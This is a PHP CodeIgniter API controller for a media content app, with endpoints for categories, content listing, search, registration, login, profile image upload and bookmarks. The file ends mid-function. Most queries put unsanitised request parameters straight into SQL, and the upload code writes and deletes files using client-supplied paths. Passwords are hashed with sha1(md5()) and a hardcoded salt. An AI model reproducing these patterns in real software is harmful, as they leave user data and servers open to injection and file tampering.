<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Api extends CI_Controller {
	
	function __construct()
	{
		parent::__construct();
        $this->load->model("dashboard/Common_model");
        $this->load->model("dashboard/User_model");
        $this->load->model("Shared_model");
	}


    //============================ Get API Key
    private function api_key()
    {
        //Get API Key from api_table
        $query = $this->db->query("Select *
				FROM api_table
				WHERE (api_id = 1) AND (api_status = 1)");

        if ($query->num_rows() > 0) {
            //$api_key = $this->encrypt->decode($query->row()->api_key);
            $api_key = $query->row()->api_key;
            return $api_key;
        }
    }


    //============================ Get main categories
	public function get_main_categories()
	{
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                //Show Json
                $category_status = 1; //Active status
                $q = $this->db->query("Select category_id, category_title, category_image
				FROM category_table
				WHERE (category_status = $category_status AND category_parent_id = 0) 
				ORDER BY category_order ASC;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

            }else{
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
	}


    //============================ Get sub categories
    public function get_sub_categories($parnet_id="1")
    {
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                //Show Json
                $category_status = 1; //Active status
                $q = $this->db->query("Select category_id, category_title, category_image
				FROM category_table
				WHERE (category_status = $category_status AND category_parent_id = $parnet_id) 
				ORDER BY category_order ASC;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

            }else{
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //============================ Get one page
    public function get_one_page($page_id="1")
    {
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key())
            {
                //Show Json
                $q = $this->db->query("Select *
                                        FROM page_table
                                        WHERE page_id = $page_id;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    //echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }
            else
                echo $this->lang->line("The API Key is Invalid!");
        }
    }


    //=================================================================================//
    public function get_sliders()
    {

        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key())
            {
                //Show Json
                $slider_status = 1; //Active status
                $q = $this->db->query("Select *
				                        FROM slider_table
				                        WHERE (slider_status = $slider_status) 
				                        ORDER BY slider_id ASC;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }
            else
                echo $this->lang->line("The API Key is Invalid!");
        }
    }


    //=================================================================================//
	public function get_last_content()
	{
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }


            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
	}


    //=================================================================================//
    public function get_featured_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_featured = 1)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_featured = 1) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_special_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_special = 1)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_special = 1) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_content_by_category_No_Load_More($limit="40", $category_id="1")
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired
                $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_category_id = $category_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_content_by_category()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                if(isset($_GET['category_id'])) $category_id = $_GET['category_id'];
                if(isset($_GET['last_id'])) $last_id = $_GET['last_id'];
                if(isset($_GET['limit'])) $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_category_id = $category_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{// *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
								WHERE (content_status = $content_status) AND (content_category_id = $category_id) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_one_content($content_id="")
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired
                $q = $this->db->query("Select content_table.*, category_table.category_title, user_table.user_username
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN user_table
                                ON content_table.content_user_id = user_table.user_id
                                WHERE (content_status = $content_status AND content_id = $content_id);");
                if ($q->num_rows() == 0)
                {
                    echo $this->lang->line("Nothing Found...");
                }
                echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function total_content_viewed()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('content_id', 'content_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                } else {
                    //Update total view +1
                    $content_id = $this->input->post('content_id');
                    $this->db->query("UPDATE content_table SET content_viewed = content_viewed + 1 WHERE content_id = '$content_id'");
                }
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_content_by_search()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                if(isset($_GET['keyword'])) $keyword = $_GET['keyword'];
                if(isset($_GET['last_id'])) $last_id = $_GET['last_id'];
                if(isset($_GET['limit'])) $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
				                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
                                WHERE (content_status = $content_status AND (content_title LIKE '%$keyword%' OR content_description LIKE '%$keyword%'))
                                ORDER BY content_id DESC
                                LIMIT $limit;");
                    if ($q->num_rows() == 0)
                    {
                        echo $this->lang->line("Nothing Found...");
                    }
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title,
                                              user_role_table.user_role_title
				                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                INNER JOIN user_role_table
                                ON content_table.content_user_role_id = user_role_table.user_role_id
                                WHERE (content_status = $content_status AND (content_title LIKE '%$keyword%' OR content_description LIKE '%$keyword%')) AND (content_id < $last_id)
                                ORDER BY content_id DESC
                                LIMIT $limit;");
                    if ($q->num_rows() == 0)
                    {
                        echo $this->lang->line("Nothing Found...");
                    }
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //============================ Hash password
    private function hash_password($user_password){
        $salt_password = "dF$.50^&D10?#^dA2z";
        return $hash_password = sha1(md5($user_password.$salt_password));
    }


    //=================================================================================//
    public function user_register()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_firstname', 'user_firstname', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_lastname', 'user_lastname', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_username', 'user_username', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_email', 'user_email', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_password', 'user_password', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_referral', 'user_referral', 'trim|xss_clean');
                $this->form_validation->set_rules('user_device_type_id', 'user_device_type_id', 'trim|xss_clean');
                $this->form_validation->set_rules('user_onesignal_player_id', 'user_onesignal_player_id', 'trim|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidation";
                } else {
					
                    //Check if user_username is exist
                    $q = $this->db->get_where('user_table', array('user_username' => $this->input->post('user_username')));
                    if ($q->num_rows() > 0)
                    {
                        echo "UsernameExist";
                        $this->db->close();
                        die();
                    }
					
                    //Check if user_email is exist
                    if ($this->input->post('user_email') != null) {
                        $q = $this->db->get_where('user_table', array('user_email' => $this->input->post('user_email')));
                        if ($q->num_rows() > 0) {
                            echo "EmailExist";
                            $this->db->close();
                            die();
                        }
                    }
					
                    //Check if user refer not exist
					if ($this->input->post('user_referral') != null) {
                        $q = $this->db->get_where('user_table', array('user_id' => $this->input->post('user_referral')));
                        if ($q->num_rows() == 0) {
                            echo "ReferralNotExist";
                            $this->db->close();
                            die();
                        }
                    }

                    //Generate user_email_verification_code
                    $user_email_verification_code = rand(100000,999999);

                    $dataArray = array(
                        "user_firstname" => $this->input->post('user_firstname'),
                        "user_lastname" => $this->input->post('user_lastname'),
                        "user_username" => $this->Shared_model->number2english($this->input->post('user_username')),
                        "user_mobile" => $this->input->post('user_username'),
                        "user_email" => $this->input->post('user_email'),
                        "user_password" => $this->hash_password($this->Shared_model->number2english($this->input->post('user_password'))),
                        "user_email_verification_code" => $this->encrypt->encode($user_email_verification_code),
                        "user_referral" => $this->input->post('user_referral'),
                        "user_device_type_id" => $this->input->post('user_device_type_id'),
                        "user_onesignal_player_id" => $this->input->post('user_onesignal_player_id'),
                        "user_reg_date" => now(),
                    );
                    //Insert $dataArray to DB
                    $result = $this->Common_model->data_insert("user_table",$dataArray);
                    if ($result == TRUE) {
                        if ($this->input->post('user_email') != null) {
                            //Send welcome email to new user
                            /*$login_url = base_url()."dashboard/Auth";
                            $to = $this->input->post('user_email');
                            $cc = false; //To send a copy of email
                            $subject = $this->lang->line("New Account Information");
                            $message = $this->lang->line("email_new_account_information")
                                .$message = "- ".$this->lang->line("Login URL").": <a href='$login_url'>$login_url</a><br>- ".$this->lang->line("Username").": ".$user_username."<br>- ".$this->lang->line("Password").": ".$user_password."<br><br>";
                            $this->Shared_model->send_email($to, $cc, $subject, $message);*/

							//Send verification email to new user
                            $user_username = $this->input->post('user_username');
                            $verification_url = base_url()."dashboard/Auth/email_verification/".$this->encrypt->encode($this->input->post('user_email'))."/".$this->encrypt->encode($user_email_verification_code);
                            $to = $this->input->post('user_email');
                            $cc = false; //To send a copy of email
                            $subject = $this->lang->line("Email Verification");
                            $message = $this->lang->line("email_verification_description")
                                .$message = "- ".$this->lang->line("Verification URL").": <a href='$verification_url'>$verification_url</a><br>- ".$this->lang->line("Username").": ".$user_username."<br>- ".$this->lang->line("Verification Code").": ".$user_email_verification_code."<br><br>";
                            $this->Shared_model->send_email($to, $cc, $subject, $message);
                        }

            
                        //Insert data into activity_table
                        $this->db->select('user_id');
                        $q = $this->db->get_where('user_table', array('user_username'=> $this->input->post('user_username')));
                        $last_id = $q->result()[0]->user_id;
                        $dataArray = array(
                            "activity_user_id" => $last_id,
                            "activity_time" => now(),
                            "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                            "activity_ip" => $this->input->ip_address(),
                            "activity_desc" => $this->lang->line("User joined from android."),
                        );
                        $this->Common_model->data_insert("activity_table",$dataArray);

                        //Update user coin if, user_referral exist
                        /*$user_referral = $this->input->post('user_referral');
                        if($user_referral != null){
                            $user_coin = 10;
                            $friend_coin = 10;
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_referral'");
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$friend_coin' WHERE user_id = '$last_id'");

                            $dataArray = array(
                                "activity_user_id" => $last_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from friend referral").": ".$friend_coin." ".$this->lang->line("Coin(s)"),
                            );
                            $this->Common_model->data_insert("activity_table",$dataArray);

                            $dataArray = array(
                                "activity_user_id" => $user_referral,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from friend invitation").": ".$friend_coin." ".$this->lang->line("Coin(s)"),
                            );
                            $this->Common_model->data_insert("activity_table",$dataArray);
                        }*/

                        echo "Success";
                        $this->db->close();
                        die();

                    } else {
                        echo "NotSuccess";
                        $this->db->close();
                        die();
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


	//=================================================================================//
	public function update_profile()
	{
		if (isset($_GET['api_key'])) {
			$access_key_received = $_GET['api_key'];
			if ($access_key_received == $this->api_key()) {
				// API key is correct
				$this->form_validation->set_rules('user_username', 'user_username', 'trim|required|xss_clean');
				$this->form_validation->set_rules('user_firstname', 'user_firstname', 'trim|required|xss_clean');
				$this->form_validation->set_rules('user_lastname', 'user_lastname', 'trim|required|xss_clean');
				$this->form_validation->set_rules('user_email', 'user_email', 'trim|required|xss_clean');
				$this->form_validation->set_rules('user_password', 'user_password', 'trim|xss_clean');
				if ($this->form_validation->run() == FALSE) {
					echo "FormValidationError";

				} else {
					$old_password = $this->input->post('user_password');
					if($old_password == "")
					{
						$dataArray = array(
							"user_firstname" => $this->input->post('user_firstname'),
							"user_lastname" => $this->input->post('user_lastname'),
							"user_email" => $this->input->post('user_email'),
						);

					}else{
						$dataArray = array(
							"user_firstname" => $this->input->post('user_firstname'),
							"user_lastname" => $this->input->post('user_lastname'),
							"user_email" => $this->input->post('user_email'),
							"user_password" => $this->hash_password($this->Shared_model->number2english($old_password)),
						);
					}

					//Update $dataArray to DB
					$table = "user_table";
					$this->db->update($table,$dataArray,array("user_username"=>$this->input->post('user_username')));
					echo "Success";
				}
			}else{
				// API key is invalid
				echo $this->lang->line("The API Key is Invalid!");
			}
		}
	}


	//=================================================================================//
	public function upload_image_profile()
	{
		if (isset($_GET['api_key'])) {
			$access_key_received = $_GET['api_key'];
			if ($access_key_received == $this->api_key()) {
				// API key is correct
				$this->form_validation->set_rules('coded_image', 'coded_image', 'trim|required|xss_clean');
				$this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
				$this->form_validation->set_rules('old_user_image', 'old_user_image', 'trim|required|xss_clean');
				$this->form_validation->set_rules('img_name', 'img_name', 'trim|required|xss_clean');
				if ($this->form_validation->run() == FALSE) {
					echo "FormValidationError";

				} else {
					$coded_image = $this->input->post('coded_image');
					$user_id = $this->input->post('user_id');
					$old_user_image = $this->input->post('old_user_image');
					$img_name = $this->input->post('img_name');

					$path = "assets/upload/user/profile_img/$img_name.png";
					$full_path = base_url().$path;

					file_put_contents($path,base64_decode($coded_image));

					$dataArray = array(
						"user_image" => $img_name.".png",
					);
					//Update $dataArray to DB
					$table = "user_table";
					$this->db->update($table,$dataArray,array("user_id"=>$user_id));

					//Delete old photo
					if($old_user_image != "avatar.png") {
						$old_user_image = "assets/upload/user/profile_img/".$old_user_image;
						unlink($old_user_image);
					}

					echo "Success";
				}
			}else{
				// API key is invalid
				echo $this->lang->line("The API Key is Invalid!");
			}
		}
	}


    //=================================================================================//
    public function user_login()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_username', 'user_username', 'trim|required|xss_clean');
                $this->form_validation->set_rules('user_password', 'user_password', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                } else {
                    $user_username = $this->input->post('user_username');
                    $user_username = $this->Shared_model->number2english($user_username);
                    $user_password = $this->input->post('user_password');
                    $user_password = $this->hash_password($user_password);

                    if ($this->User_model->auth_user_information('user_table', $user_username, $user_password) == true)
                    {
                        $result = $this->User_model->read_user_information('user_table', $user_username);
                        if ($result != false) {
                            $querySettingVerification = $this->db->query("SELECT setting_email_verification, setting_mobile_verification, setting_document_verification
                                                                            FROM setting_table WHERE setting_id = 1");
                            if($querySettingVerification->row()->setting_email_verification == 1)
                            {
                                //Check email is verify or not
                                $queryEmailVerify = $this->db->query("SELECT user_email_verified FROM user_table WHERE user_username = '$user_username'");
                                if($queryEmailVerify->row()->user_email_verified != 1)
                                {
                                    echo $this->lang->line("Your email has not been verified.");
                                    die();
                                }
                            }

                            //Check user_status is Active or Inactive
                            $checkUserStatus = $this->db->query("SELECT user_status FROM user_table WHERE user_username = '$user_username'");
                            if($checkUserStatus->row()->user_status != 1)
                            {
                                echo $this->lang->line("Your account has been blocked. Please contact administrator.");
                                die();
                            }

                            //Insert data into activity_table
                            $dataArray = array(
                                "activity_user_id" => $result[0]->user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_login_status" => 1,
                                "activity_desc" => $this->lang->line("User login into the android app."),
                            );
                            $this->Common_model->data_insert("activity_table", $dataArray);
                            echo "Success";
                        }

                    }else{
                        echo "Failed";
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //==============================================================================//
    public function add_to_bookmark()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('content_id', 'content_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                } else {
                    $user_id = $this->input->post('user_id');
                    $content_id = $this->input->post('content_id');

                    $data = array(
                        'bookmark_user_id' => $user_id,
                        'bookmark_content_id' => $content_id,
                    );

                    if ($this->db->insert('bookmark_table', $data))
                    {
                        echo $this->lang->line("Add to bookmark successfully.");

                    }else{
                        echo $this->lang->line("Error!");
                    }
                }
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //==============================================================================//
    public function remove_from_bookmark()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('content_id', 'content_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                } else {
                    $user_id = $this->input->post('user_id');
                    $content_id = $this->input->post('content_id');

                    $this->db->where('bookmark_user_id', $user_id);
                    $this->db->where('bookmark_content_id', $content_id);
                    $this->db->delete('bookmark_table');
                    echo $this->lang->line("Remove from bookmark successfully.");
                }
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_bookmark_status()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $user_id = $_GET['user_id'];
                $content_id = $_GET['content_id'];
                if (!empty($user_id) AND !empty($content_id))
                {
                    $q = $this->db->query("Select *
                                           FROM bookmark_table
                                           WHERE (bookmark_user_id = $user_id AND bookmark_content_id = $content_id);");
                    if ($q->num_rows() > 0)
                    {
                        echo "ContentIsBookmark";
                        $this->db->close();
                        die();
                    }else{
                        echo "ContentIsNotBookmark";
                        $this->db->close();
                        die();
                    }
                }

            }else{
